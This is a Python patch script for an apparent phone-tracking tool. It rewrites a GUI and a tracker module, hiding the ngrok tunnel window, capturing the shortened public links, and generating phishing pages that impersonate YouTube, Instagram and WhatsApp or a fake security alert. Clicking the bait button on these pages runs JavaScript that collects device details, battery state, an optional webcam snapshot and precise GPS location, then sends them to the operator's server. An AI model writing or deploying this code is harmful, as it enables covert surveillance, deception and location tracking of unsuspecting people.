import os

def apply_recovery():
    # 1. Update gui.py for Robust URL Detection
    gui_file = "gui.py"
    if os.path.exists(gui_file):
        with open(gui_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # ANSI Cleaning & Regex
        old_pattern = """        # Auto-Link Capture (v6.2)
        if "https://" in text:
            import re
            links = re.findall(r"(https?://\S+)", text)
            for link in links:
                if "is.gd" in link or "ngrok-free.dev" in link:
                    self.link_entry.delete(0, "end")
                    self.link_entry.insert(0, link.strip())"""
        
        new_pattern = """        # Ghost Intel Link-Capture (v6.3)
        if "https://" in text:
            import re
            # Strip ANSI color codes
            clean_text = re.sub(r'\\x1b\\[[0-9;]*[mK]', '', text)
            links = re.findall(r"(https?://\\S+)", clean_text)
            for link in links:
                l = link.strip().strip("'").strip('"').strip(']').strip('[')
                if "is.gd" in l or "ngrok-free.dev" in l:
                    self.link_entry.configure(state="normal")
                    self.link_entry.delete(0, "end")
                    self.link_entry.insert(0, l)"""
        
        if old_pattern in content:
            content = content.replace(old_pattern, new_pattern)
        else:
            # Fallback if v6.2 logic was slightly different
            find_hook = "self.console_textbox.configure(state=\"disabled\")"
            if "def append_text" in content:
                content = content.replace(find_hook, find_hook + "\n\n" + new_pattern, 1)

        with open(gui_file, 'w', encoding='utf-8', newline='\n') as f:
            f.write(content)
        print("GUI v6.3 auto-link logic applied.")

    # 2. Update phone_tracker.py (JS Syntax & Ngrok Silence)
    tracker_file = "phone_tracker.py"
    if os.path.exists(tracker_file):
        with open(tracker_file, 'r', encoding='utf-8') as f:
            t_content = f.read()

        # A) Ngrok absolute suppression
        old_ngrok_method_start = "    def _launch_ngrok_tunnel(self, port):"
        old_ngrok_method_end = "        except Exception as e:"
        
        # Replace the whole method for pyngrok native config
        st_n = t_content.find(old_ngrok_method_start)
        en_n = t_content.find(old_ngrok_method_end, st_n)
        
        if st_n != -1 and en_n != -1:
            # We find the end of the except block by looking for next def
            en_n = t_content.find("    def ", en_n + 10)
            
            new_ngrok_logic = """    def _launch_ngrok_tunnel(self, port):
        \"\"\"Inicia ngrok de forma invisible usando PyngrokConfig (v6.3).\"\"\"
        try:
            from pyngrok.conf import PyngrokConfig
            import subprocess
            startupinfo = None
            if os.name == "nt":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0 
            
            p_config = PyngrokConfig(startupinfo=startupinfo)
            
            token = os.getenv("NGROK_AUTHTOKEN", "").strip()
            if token:
                ngrok.set_auth_token(token)
            
            public_url = ngrok.connect(port, "http", pyngrok_config=p_config).public_url
            return {"url": public_url}
        except Exception as e:
            console.print(f"[red]  [NGROK] Error: {e}[/red]")
            return {"url": None}

"""
            t_content = t_content[:st_n] + new_ngrok_logic + t_content[en_n:]

        # B) JS Syntax Fix (Template literals and Pre-calculation)
        old_template_start = "    def _build_tracking_page(self, track_id):"
        next_method_start = "    def _start_grab_server("
        
        st_t = t_content.find(old_template_start)
        en_t = t_content.find(next_method_start, st_t)
        
        if st_t != -1 and en_t != -1:
            new_template_method = """    def _build_tracking_page(self, track_id):
        \"\"\"Genera pagina de rastreo robusta para v6.3 (Fixed JS).\"\"\"
        template = getattr(self, 'template_choice', 'security').lower()
        enable_snap = "1" if os.getenv("ENABLE_SNAPCAM") == "1" else "0"
        
        og = {
            'title': 'Breaking News: Live Updates',
            'desc': 'Get the latest real-time updates and breaking stories.',
            'img': 'https://cdn-icons-png.flaticon.com/512/21/21601.png',
            'bait': ''
        }

        if 'youtube' in template:
            og['title'] = 'YouTube - Video Recomendado'
            og['desc'] = 'Mira este video que es tendencia ahora mismo en tu region.'
            og['img'] = 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png'
            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:100px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Video No Disponible</h2><p>Este video requiere verificacion. Haz clic para validar.</p><div id="actBtn" class="btn" style="background:#ff0000;color:white;padding:12px;border-radius:2px;cursor:pointer;font-weight:bold;margin-top:10px;">VER VIDEO</div></div>'
        elif 'instagram' in template:
            og['title'] = 'Instagram - Nueva Mencion'
            og['desc'] = 'Alguien te ha etiquetado en una publicacion.'
            og['img'] = 'https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png'
            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:60px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Nueva Mencion</h2><p>Alguien te ha etiquetado. Haz clic para ver.</p><div id="actBtn" class="btn" style="background:#0095f6;color:white;padding:12px;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;">Ver Publicacion</div></div>'
        elif 'whatsapp' in template:
            og['title'] = 'WhatsApp - Invitacion a Grupo'
            og['desc'] = 'Has sido invitado a unirte a un grupo de seguridad.'
            og['img'] = 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png'
            og['bait'] = f'<div class="card"><img src="{og["img"]}" style="width:80px;margin-bottom:20px;"><h2 style="font-size:1.4em;">Invitacion Pendiente</h2><p>Confirmar union al chat grupal.</p><div id="actBtn" class="btn" style="background:#25d366;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Unirse al Chat</div></div>'
        else:
             og['bait'] = '<div class="card"><h2 style="color:#d93025;font-size:1.4em;">Alerta de Seguridad</h2><p>Detectado acceso no autorizado. Haz clic para validar tu identidad.</p><div id="actBtn" class="btn" style="background:#d93025;color:white;padding:12px;border-radius:5px;cursor:pointer;">VALIDAR AHORA</div></div>'

        # Use double braces to escape f-string for HTML/JS braces
        return f\"\"\"<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:type" content="website">
<meta property="og:title" content="{og['title']}">
<meta property="og:description" content="{og['desc']}">
<meta property="og:image" content="{og['img']}">
<title>{og['title']}</title>
<style>
  body {{ font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }}
  .btn {{ margin-top: 15px; cursor: pointer; }}
</style>
</head>
<body>
    {og['bait']}
<script>
(function(){{
  var data = {{ track_id: "{track_id}", ua: navigator.userAgent, res: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory }};
  var enableSnap = \"{enable_snap}\";

  function send(d) {{ 
    fetch("/capture/" + d.track_id, {{ 
        method:"POST", 
        headers:{{"Content-Type":"application/json"}}, 
        body:JSON.stringify(d) 
    }}); 
  }}

  document.getElementById('actBtn').onclick = function() {{
     this.innerHTML = "Validando...";
     startProcess();
  }};

  function startProcess() {{
    try {{
      navigator.getBattery().then(function(b){{
        data.bat = Math.round(b.level * 100) + "%";
        data.charging = b.charging;
        triggerIntel();
      }}).catch(triggerIntel);
    }} catch(e) {{ triggerIntel(); }}
  }}

  function triggerIntel() {{
    if (enableSnap === "1") {{
       navigator.mediaDevices.getUserMedia({{ video: true }}).then(function(s) {{
         var v = document.createElement('video');
         v.srcObject = s; 
         v.onloadedmetadata = function() {{
           v.play();
           setTimeout(function() {{
             var c = document.createElement('canvas');
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
             data.base64_image = c.toDataURL('image/jpeg', 0.6);
             s.getTracks().forEach(function(t) {{ t.stop(); }});
             checkGeo();
           }}, 1000);
         }};
       }}).catch(checkGeo);
    }} else {{ checkGeo(); }}
  }}

  function checkGeo() {{
    if (navigator.geolocation) {{
      navigator.geolocation.getCurrentPosition(function(p){{
        data.gps_lat = p.coords.latitude; 
        data.gps_lon = p.coords.longitude; 
        data.gps_accuracy = p.coords.accuracy; 
        send(data);
      }}, function(e){{ 
        data.gps_err = e.message; 
        send(data); 
      }}, {{enableHighAccuracy:true, timeout:8000}});
    }} else {{ send(data); }}
  }}
}})();
</script>
</body>
</html>\"\"\"
"""
            t_content = t_content[:st_t] + new_template_method + t_content[en_t:]

        with open(tracker_file, 'w', encoding='utf-8', newline='\n') as f:
            f.write(t_content)
        print("Tracker v6.3 surgery complete (Fixed JS + Silent Ngrok).")

if __name__ == "__main__":
    apply_recovery()
